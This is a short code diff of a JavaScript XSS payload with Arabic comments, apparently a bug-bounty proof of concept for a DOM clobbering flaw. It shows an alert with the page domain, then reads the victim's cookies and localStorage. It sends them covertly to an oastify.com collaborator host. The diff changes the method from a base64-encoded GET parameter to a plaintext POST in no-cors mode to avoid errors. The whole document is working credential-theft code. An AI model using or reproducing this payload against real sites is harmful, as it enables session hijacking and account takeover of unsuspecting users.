@@ -1,13 +1,16 @@
+// 1. إثبات التنفيذ (عشان نصور بيها الريبورت)
 alert("DOM Clobbering XSS by Hussein on: " + document.domain);
-// استخراج الكوكيز
+
+// 2. استخراج الكوكيز والـ Local Storage
 var userCookies = document.cookie;
-// استخراج الـ Local Storage (عشان لو الـ Tokens متخزنة فيها)
 var userStorage = JSON.stringify(localStorage);
 
-// تجميع الداتا وتشفيرها عشان متعملش إيرور في اللينك
-var stolenData = btoa("Cookies: " + userCookies + " | Storage: " + userStorage);
+// 3. تجميع الداتا كنص عادي (من غير btoa عشان نتجنب إيرور الحروف)
+var exfilData = "===== COOKIES =====\n" + userCookies + "\n\n===== LOCAL STORAGE =====\n" + userStorage;
 
-// إرسال الداتا في الخفاء لسيرفر Oastify بتاعك
-fetch("https://2nqfrsyf5u919k496pa4iwbu9lfc33rs.oastify.com/?stolen=" + stolenData, {
-    mode: 'no-cors' // عشان نتخطى إيرور الـ CORS
+// 4. إرسال الداتا في الخفاء باستخدام POST Request
+fetch("https://2nqfrsyf5u919k496pa4iwbu9lfc33rs.oastify.com/", {
+    method: "POST",       // استخدام POST عشان الداتا الكبيرة
+    mode: "no-cors",      // تخطي إيرور الـ CORS
+    body: exfilData       // حط الداتا كلها هنا
 });
